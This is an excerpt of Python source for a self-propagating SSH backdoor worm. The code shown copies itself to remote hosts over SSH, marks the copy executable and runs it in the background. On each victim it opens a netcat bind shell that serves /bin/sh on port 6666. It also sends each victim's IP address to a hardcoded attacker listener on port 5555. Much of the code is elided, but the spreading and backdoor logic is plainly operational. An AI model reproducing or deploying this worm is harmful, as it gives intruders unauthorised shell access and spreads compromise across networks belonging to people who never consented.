...
# Hardcoded address of attacker
attackerAddress = '192.168.1.12'

# Global variable to act as trigger
trigger = 1
...
def spreadAndExecute(sshClient):
	...
	newSshClient.put("/tmp/backdoor_worm.py", "/tmp/backdoor_worm.py")
	
	# Make the worm file executable
	sshClient.exec_command("chmod a+x /tmp/backdoor_worm.py")
	...
	# & - keep in background
	sshClient.exec_command("nohup python /tmp/backdoor_worm.py >/tmp/out.log 2> /tmp/error.log &")
...
##################################################################
# This will be used by the attacker to receive information
# on port 5555.  The victim sends their IP address to the
# attacker
##################################################################
...
def attackerReceive():
	...
	try:
		print "Listening for victim IP addresses..."
		print "Press Ctrl + C to stop listening\n"
		
		# Get the attackers IP address
		#attackerAddress = getMyIP()
		
		# Infinite loop to always listen
		while True:
			
			# Listen on port 5555
			nc = nclib.Netcat(listen=('', LISTEN_PORT), log_send=False, log_recv=False)
		
			# Wait for somebody to connect, send the data, and disconnect
			# The data will contain the received data
			data = nc.recv_all()
...
##################################################################
# This will be used by the victim to perform a subprocess
# call and start netcat in the background.  This starts a
# backdoor that that listens on port 6666
##################################################################

def victimSend():
	# Subprocess call to open the backdoor
	subprocess.call(["nohup netcat -l -p 6666 -e /bin/sh &"], shell=True)
	
	while True:
		try:
		
			# Create a netcat object setting port and server
			nc = nclib.Netcat((attackerAddress, LISTEN_PORT))
			#nc = nclib.Netcat(('192.168.1.15', LISTEN_PORT))
		
			# Get the victims IP address
			victimAddress = getMyIP()
		
			# Send the victims IP address
			nc.send(victimAddress)
			break
			
		except:
			print "Cannot send IP address"
...
# If command line arguments are < 2, run as victim
# Else, run as attacker
if len(sys.argv) < 2:
	
	# Set trigger = 0 to ID as victim
	trigger = 0
...
# If trigger equals 1, we are attacking. Call function
# attackerReceive() so attacking host begins listening
